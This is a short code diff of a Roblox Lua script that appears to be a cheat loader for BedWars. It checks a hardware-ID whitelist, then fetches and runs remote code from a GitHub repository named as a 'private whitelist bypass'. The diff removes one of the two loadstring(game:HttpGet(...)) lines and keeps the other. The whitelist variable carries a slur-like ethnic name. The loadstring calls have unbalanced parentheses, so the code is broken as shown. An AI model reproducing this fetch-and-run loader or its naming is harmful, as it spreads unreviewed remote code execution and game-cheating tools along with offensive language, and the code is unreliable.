@@ -9,7 +9,6 @@ local workspace = game.Workspace
 if game.ReplicatedStorage:FindFirstChild("TS") then
     if hwid == whitelistednigerians then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Nebulaprivatewhitelistbypass/eee/main/Escripts/bedwars.lua')()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Nebulaprivatewhitelistbypass/eee/main/eeee')()
     end
 end
 
